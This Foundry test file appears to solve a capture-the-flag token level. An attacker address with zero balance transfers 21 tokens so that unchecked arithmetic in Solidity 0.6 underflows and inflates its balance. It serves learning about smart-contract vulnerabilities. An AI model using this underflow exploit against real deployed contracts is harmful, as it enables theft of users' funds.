// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {Token} from "../src/Token.sol";

contract TokenSolution is Test {
    Token token;
    address public USER = makeAddr("user");
    address public ATTACKER = makeAddr("attacker");

    function setUp() external {
        vm.startBroadcast(USER);
        token = new Token(20);
        vm.stopBroadcast();
    }

    function testToken() public {
        // vm.startPrank(USER);
        uint256 balanceOfMe = token.balanceOf(USER);
        console.log("The balance before transfer: ", balanceOfMe);
        vm.startBroadcast(ATTACKER);
        bool success = token.transfer(USER, 21);
        vm.stopBroadcast();
        console.log(success);
        uint256 balanceOfAttacker = token.balanceOf(ATTACKER);
        console.log("The balance after transfer: ", balanceOfAttacker);
    }
}
